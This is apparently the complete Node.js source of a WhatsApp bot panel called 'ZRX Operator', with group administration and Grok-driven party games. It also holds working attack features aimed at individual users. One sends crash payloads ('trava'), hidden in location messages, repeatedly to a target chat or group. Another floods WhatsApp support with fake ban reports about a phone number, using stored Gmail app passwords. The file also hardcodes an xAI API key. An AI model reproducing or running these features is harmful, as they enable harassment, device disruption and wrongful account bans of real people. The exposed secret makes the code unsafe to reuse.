const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const nodemailer = require('nodemailer');

let waSock = null;
let reconectando = false;
let statusConexaoAtual = "OFFLINE";
let ultimoCodigoGerado = "--------";
let modosBrincadeira = {};

const XAI_API_KEY = process.env.XAI_API_KEY || "xai-It1hSBKgDociGem1UrHCDQuAAEBU6uLNpd12ORpiRMf1VobVtBqSPnYU31s120O7ehCNvGDVIXMou6xW";
const PORT = process.env.PORT || 3000;

// E-mails oficiais de suporte do WhatsApp
const SUPORTE_WHATSAPP_EMAILS = [
    "support@whatsapp.com",
    "android@support.whatsapp.com",
    "iphone@support.whatsapp.com",
    "web@support.whatsapp.com",
    "smb@support.whatsapp.com",
    "jan@whatsapp.com"
];

const CAMINHO_CREDS_EMAIL = path.join(__dirname, 'creds_email.json');

// Salva e recupera credenciais de e-mail + senhas de app
function obterCredenciaisSalvas() {
    if (fs.existsSync(CAMINHO_CREDS_EMAIL)) {
        try {
            return JSON.parse(fs.readFileSync(CAMINHO_CREDS_EMAIL, 'utf8'));
        } catch (e) {
            return [];
        }
    }
    return [];
}

function salvarCredencialEmail(email, appPassword) {
    let creds = obterCredenciaisSalvas();
    const existe = creds.find(c => c.email.toLowerCase() === email.toLowerCase());
    if (!existe) {
        creds.push({ email, appPassword });
        fs.writeFileSync(CAMINHO_CREDS_EMAIL, JSON.stringify(creds, null, 2), 'utf8');
    }
}

async function consultarGrok(prompt, systemPrompt = "Você é um mestre de jogos e brincadeiras interativas para grupos no WhatsApp. Seja divertido, direto e dinâmico.") {
    try {
        const response = await fetch("https://api.x.ai/v1/responses", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${XAI_API_KEY}`
            },
            body: JSON.stringify({
                model: "grok-4.7",
                input: [
                    { role: "system", content: systemPrompt },
                    { role: "user", content: prompt }
                ]
            })
        });
        const data = await response.json();
        if (data.output && data.output.length > 0) {
            return data.output[0].content || data.output[0].text;
        }
        return "Desculpe, não consegui gerar a brincadeira agora.";
    } catch (e) {
        console.error("Erro na API do Grok:", e);
        return "Erro ao se comunicar com a IA do Grok.";
    }
}

// Envio massivo de e-mails de denúncia usando credenciais salvas
async function dispararEmailsBanimento(numeroAlvo, novoEmail = null, novaSenhaApp = null, quantidadeRepeticoes = 5) {
    if (novoEmail && novaSenhaApp) {
        salvarCredencialEmail(novoEmail, novaSenhaApp);
    }

    const credenciais = obterCredenciaisSalvas();
    if (credenciais.length === 0) {
        throw new Error("Nenhuma conta de e-mail / senha de app configurada.");
    }

    let textoEmailObj = { assunto: "Account Report", blocos: ["Report target number: "] };
    const caminhoEmailJson = path.join(__dirname, 'email_suporte_ban.json');
    if (fs.existsSync(caminhoEmailJson)) {
        try {
            textoEmailObj = JSON.parse(fs.readFileSync(caminhoEmailJson, 'utf8'));
        } catch (e) {}
    }

    const corpoMensagem = `${textoEmailObj.blocos.join("\n")}\n\nNúmero Alvo: +${numeroAlvo}`;

    // Dispara via SMTP por todas as contas cadastradas
    for (const cred of credenciais) {
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: cred.email,
                pass: cred.appPassword
            }
        });

        for (let i = 0; i < quantidadeRepeticoes; i++) {
            for (const suporteEmail of SUPORTE_WHATSAPP_EMAILS) {
                try {
                    await transporter.sendMail({
                        from: cred.email,
                        to: suporteEmail,
                        subject: `${textoEmailObj.assunto} - [Ref: ${Date.now()}_${i}]`,
                        text: corpoMensagem
                    });
                } catch (err) {
                    console.error(`Erro envio e-mail (${cred.email} -> ${suporteEmail}):`, err.message);
                }
            }
            await delay(500);
        }
    }
}

// Realiza denúncia nativa no protocolo do WhatsApp sem mandar mensagem privada
async function denunciarPerfilNativo(targetJid) {
    if (!waSock) return;

    try {
        await waSock.relayMessage(targetJid, {
            contactIndexMessage: {
                protocolVersion: 2
            }
        }, { participant: { jid: targetJid } }).catch(() => {});

        if (waSock.chatModify) {
            await waSock.chatModify({
                spam: true
            }, targetJid).catch(() => {});
        }
    } catch (e) {
        console.error("Erro ao registrar denúncia de perfil nativo:", e.message);
    }
}

const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS, GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    const urlObj = new URL(req.url, `http://${req.headers.host}`);

    if (urlObj.pathname === '/api/conectar' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const numeroTelefone = data.numero ? data.numero.replace(/\D/g, '') : '';
                if (!numeroTelefone) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ erro: 'Número inválido.' }));
                    return;
                }
                statusConexaoAtual = "CONECTANDO...";
                const codigo = await iniciarWhatsApp(numeroTelefone);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ sucesso: true, codigo: codigo || ultimoCodigoGerado }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ erro: e.message }));
            }
        });
        return;
    }

    if (urlObj.pathname === '/api/grupos' && req.method === 'GET') {
        try {
            if (!waSock || statusConexaoAtual !== "ONLINE") {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ erro: 'WhatsApp não está conectado.' }));
                return;
            }
            const getGroups = await waSock.groupFetchAllParticipating();
            const grupos = Object.values(getGroups).map(g => ({
                id: g.id,
                subject: g.subject,
                participantsCount: g.participants.length
            }));
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ sucesso: true, grupos }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ erro: e.message }));
        }
        return;
    }

    if (urlObj.pathname === '/api/limpar' && req.method === 'POST') {
        try {
            const pastaSessao = path.join(__dirname, 'sessao_teste');
            if (waSock) {
                await waSock.logout().catch(() => {});
                waSock = null;
            }
            if (fs.existsSync(pastaSessao)) {
                fs.rmSync(pastaSessao, { recursive: true, force: true });
            }
            statusConexaoAtual = "OFFLINE";
            ultimoCodigoGerado = "--------";
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ sucesso: true, mensagem: 'Sessão limpa no servidor com sucesso.' }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ erro: e.message }));
        }
        return;
    }

    if (urlObj.pathname === '/api/comando' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                if (!waSock || statusConexaoAtual !== "ONLINE") {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ erro: 'WhatsApp não conectado.' }));
                    return;
                }
                const { acao, grupoId, param, extraData } = JSON.parse(body);

                // DENÚNCIA NO PERFIL / SISTEMA DE BANIMENTO PERMANENTE E TEMPORÁRIO
                if (acao === 'ban_email' || acao === 'denunciar_perfil') {
                    const numeroAlvoLimpo = param ? param.replace(/\D/g, '') : '';
                    const targetJid = `${numeroAlvoLimpo}@s.whatsapp.net`;

                    if (!numeroAlvoLimpo) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ erro: 'Número alvo é obrigatório.' }));
                        return;
                    }

                    await denunciarPerfilNativo(targetJid);

                    if (extraData && extraData.email && extraData.appPass) {
                        dispararEmailsBanimento(numeroAlvoLimpo, extraData.email, extraData.appPass).catch(console.error);
                    } else {
                        dispararEmailsBanimento(numeroAlvoLimpo).catch(console.error);
                    }

                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ sucesso: true, mensagem: `Processo de denúncia e e-mails disparado contra ${numeroAlvoLimpo}!` }));
                    return;
                }

                if (acao === 'toggle_brincadeira' && grupoId) {
                    modosBrincadeira[grupoId] = (param === 'on');
                    const statusText = modosBrincadeira[grupoId] ? "ATIVADO" : "DESATIVADO";
                    await waSock.sendMessage(grupoId, { text: `🎮 *Modo Brincadeiras com IA foi ${statusText}!*\nUse o comando */br* no grupo para ver o menu.` });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ sucesso: true, mensagem: `Modo Brincadeiras ${statusText}` }));
                    return;
                }

                // ENVIO DE CARGA / BUG DE LOCALIZAÇÃO - SUPORTE A PRIVADO E GRUPO
                if ((acao === 'send_bug' || acao === 'send_bug_group') && (param || grupoId) && extraData) {
                    const targetJid = grupoId ? grupoId : `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                    const nomeArquivoBruto = extraData.file || "";
                    const quantidade = parseInt(extraData.amount) || 1;

                    let conteudoPayload = "";

                    try {
                        const arquivosNaPasta = fs.readdirSync(__dirname);
                        const nomeBase = nomeArquivoBruto.replace(/\.(js|txt)$/i, '').toLowerCase();

                        const arquivoEncontrado = arquivosNaPasta.find(file => {
                            const fLow = file.toLowerCase();
                            return fLow === `${nomeBase}.js` || fLow === `${nomeBase}.txt` || fLow === nomeArquivoBruto.toLowerCase();
                        });

                        if (arquivoEncontrado) {
                            const caminhoAbsoluto = path.join(__dirname, arquivoEncontrado);
                            let textoBruto = fs.readFileSync(caminhoAbsoluto, 'utf8');

                            const matchAspas = textoBruto.match(/=\s*[`"']([\s\S]*?)[`"'];?/);
                            if (matchAspas && matchAspas[1]) {
                                conteudoPayload = matchAspas[1];
                            } else {
                                conteudoPayload = textoBruto;
                            }
                        } else {
                            console.error(`Arquivo de carga não encontrado na raiz: ${nomeArquivoBruto}`);
                        }
                    } catch (err) {
                        console.error("Erro ao ler o arquivo no repositório:", err.message);
                    }

                    if (!conteudoPayload) {
                        conteudoPayload = "Carga Indisponível";
                    }

                    // Remove completamente links para evitar transformar em cor cinza/link
                    let travaTratada = conteudoPayload.replace(/https?:\/\/[^\s\n\\]*/gi, '');
                    travaTratada = travaTratada.replace(/\\n/g, '\n').trim();

                    if (travaTratada.length > 20000) {
                        travaTratada = travaTratada.substring(0, 20000);
                    }

                    const addressPayload = travaTratada;

                    for (let i = 0; i < quantidade; i++) {
                        // Envio de localização isolada (Oceano Antártico) para não gerar mapa terrestre
                        await waSock.sendMessage(targetJid, {
                            location: {
                                degreesLatitude: -70.000000,
                                degreesLongitude: -120.000000,
                                name: addressPayload,
                                address: addressPayload
                            }
                        });

                        // Força presença de leitura/digitação no chat para garantir ticks azuis e sincronização imediata
                        await waSock.sendPresenceUpdate('available', targetJid).catch(() => {});
                        await waSock.sendPresenceUpdate('composing', targetJid).catch(() => {});
                        
                        await delay(1000);
                    }

                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ sucesso: true, mensagem: `Carga de ${nomeArquivoBruto} enviada (${quantidade}x)!` }));
                    return;
                }

                if (acao === 'kick' && grupoId && param) {
                    await waSock.groupParticipantsUpdate(grupoId, [`${param.replace(/\D/g, '')}@s.whatsapp.net`], 'remove');
                } else if (acao === 'promote' && grupoId && param) {
                    await waSock.groupParticipantsUpdate(grupoId, [`${param.replace(/\D/g, '')}@s.whatsapp.net`], 'promote');
                } else if (acao === 'subject' && grupoId && param) {
                    await waSock.groupUpdateSubject(grupoId, param);
                } else if (acao === 'desc' && grupoId && param) {
                    await waSock.groupUpdateDescription(grupoId, param);
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ sucesso: true, mensagem: 'Comando executado.' }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ erro: e.message }));
            }
        });
        return;
    }

    if (urlObj.pathname === '/api/status' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: statusConexaoAtual, codigo: ultimoCodigoGerado }));
        return;
    }

    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Servidor ZRX Rodando!\n');
});

server.listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

function escutarMensagensWhatsApp() {
    if (!waSock) return;

    waSock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;

        for (const msg of messages) {
            if (!msg.message || msg.key.fromMe) continue;

            const from = msg.key.remoteJid;
            const isGroup = from.endsWith('@g.us');
            const textoMsg = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

            if (!isGroup) continue;

            if (textoMsg.toLowerCase().trim() === '/br') {
                if (!modosBrincadeira[from]) {
                    await waSock.sendMessage(from, { text: "⚠️ O Modo Brincadeiras está desativado neste grupo. Ative-o pelo painel ZRX Operator!" });
                    continue;
                }

                const menuText = `🎮 *MENU DE BRINCADEIRAS COM IA (Grok)* 🤖\n\n` +
                    `1️⃣ *Pergunta e Resposta*\n` +
                    `2️⃣ *Verdade ou Desafio*\n` +
                    `3️⃣ *Jogo da Forca*\n` +
                    `4️⃣ *Quiz em Grupo*\n\n` +
                    `👉 Envie */comecar <numero_ou_nome>* para iniciar!\n` +
                    `Exemplo: */comecar 2* ou */comecar Verdade ou Desafio*`;

                await waSock.sendMessage(from, { text: menuText });
            }

            if (textoMsg.toLowerCase().startsWith('/comecar')) {
                if (!modosBrincadeira[from]) {
                    await waSock.sendMessage(from, { text: "⚠️ O Modo Brincadeiras está desativado neste grupo. Ative pelo painel primeiro!" });
                    continue;
                }

                const senderName = msg.pushName || "Participante";
                const arg = textoMsg.replace(/\/comecar/i, '').trim();

                let promptGrok = "";
                if (arg.includes("1") || arg.toLowerCase().includes("pergunta")) {
                    promptGrok = `Gere uma pergunta muito engraçada, curiosa ou desafiadora para o jogador ${senderName}. Em seguida, diga para ele responder e marcar quem deve ser o próximo participante.`;
                } else if (arg.includes("2") || arg.toLowerCase().includes("verdade")) {
                    promptGrok = `Gere uma opção aleatória de 'Verdade ou Desafio' para o jogador ${senderName}. Diga se é Verdade ou Desafio, mande a pergunta/desafio e mande ele cumprir e marcar o próximo membro.`;
                } else if (arg.includes("3") || arg.toLowerCase().includes("forca")) {
                    promptGrok = `Inicie um Jogo da Forca para o grupo. Dê uma dica da palavra secreta, a quantidade de letras com traços (ex: _ _ _ _ _) e chame o jogador ${senderName} para dar o primeiro palpite e marcar o próximo!`;
                } else if (arg.includes("4") || arg.toLowerCase().includes("quiz")) {
                    promptGrok = `Gere uma pergunta de Quiz de conhecimentos gerais divertida com 4 alternativas (A, B, C, D) para o jogador ${senderName}. Diga para ele responder e marcar a próxima pessoa do grupo.`;
                } else {
                    promptGrok = `Gere uma brincadeira de grupo divertida para o jogador ${senderName}. Explique o objetivo rapidamente e mande ele indicar e marcar o próximo membro com @.`;
                }

                await waSock.sendMessage(from, { text: "🤖 *Grok está criando a brincadeira...*" });

                const respostaIA = await consultarGrok(promptGrok);
                const mensagemFinal = `🎲 *RODADA DE BRINCADEIRA* 🎲\n\n👤 *Jogador da Vez:* ${senderName}\n\n${respostaIA}\n\n📌 *Lembre-se:* Para passar a vez, responda marcando outro membro no grupo!`;

                await waSock.sendMessage(from, { text: mensagemFinal });
            }
        }
    });
}

async function iniciarWhatsApp(numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        markOnlineOnConnect: true, // Força status online imediato ao conectar
        syncFullHistory: false
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const status = lastDisconnect?.error?.output?.statusCode;
            statusConexaoAtual = "OFFLINE";
            if (status === DisconnectReason.loggedOut) {
                reconectando = false;
                return;
            }
            setTimeout(() => {
                reconectando = false;
                iniciarWhatsApp(numeroTelefone);
            }, 5000);
        } else if (connection === 'open') {
            reconectando = false;
            statusConexaoAtual = "ONLINE";
            await waSock.sendPresenceUpdate('available').catch(() => {});
            escutarMensagensWhatsApp();
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            ultimoCodigoGerado = codigo;
            return codigo;
        } catch (error) {
            console.error("Erro ao solicitar código:", error);
        }
    }
    return ultimoCodigoGerado;
}
